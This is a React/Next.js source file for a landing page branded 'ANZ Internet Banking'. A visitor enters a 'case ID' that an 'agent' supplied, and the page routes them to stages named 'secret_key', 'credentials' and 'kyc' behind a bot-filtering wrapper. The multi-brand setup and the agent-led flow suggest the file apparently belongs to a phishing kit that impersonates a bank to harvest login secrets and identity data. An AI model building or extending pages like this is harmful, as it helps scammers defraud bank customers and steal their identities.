'use client';

/**
 * ANZ Landing Page
 * 
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      {/* Page Title */}
      <h1 className="page-title">ANZ Internet Banking</h1>

      {/* Login Form */}
      <div className="login-card">
        <form className="login-form" onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="case-id" className="form-label">Case ID</label>
            <input
              type="text"
              id="case-id"
              name="case-id"
              className="form-input"
              autoComplete="off"
              value={caseId}
              onChange={(e) => {
                setCaseId(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isLoading}
            />
          </div>

          {/* Error message */}
          {fieldError && (
            <div className="error-message">
              <AlertCircle className="h-4 w-4" />
              <span>{fieldError}</span>
            </div>
          )}

          {/* Continue Button - No lock icon on case ID entry */}
          <button
            type="submit"
            className="btn-signin"
            disabled={isLoading}
          >
            {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
            {isLoading ? 'Processing...' : 'Continue'}
          </button>

          <p style={{ color: 'var(--anz-white)', fontSize: '13px', textAlign: 'center', marginTop: '16px', opacity: 0.8 }}>
            If an agent has provided you with a direct link, please use that link instead.
          </p>
        </form>
      </div>

      {/* Payment Warnings Card */}
      <div className="payment-warnings">
        <a href="https://www.anz.co.nz/support/security-privacy/payment-warning/" title="New payment warnings in Internet Banking">
          <img src="/brands/anz/Payment_Warnings.jpg" alt="New payment warnings in Internet Banking" />
        </a>
      </div>
    </BotGuard>
  );
}
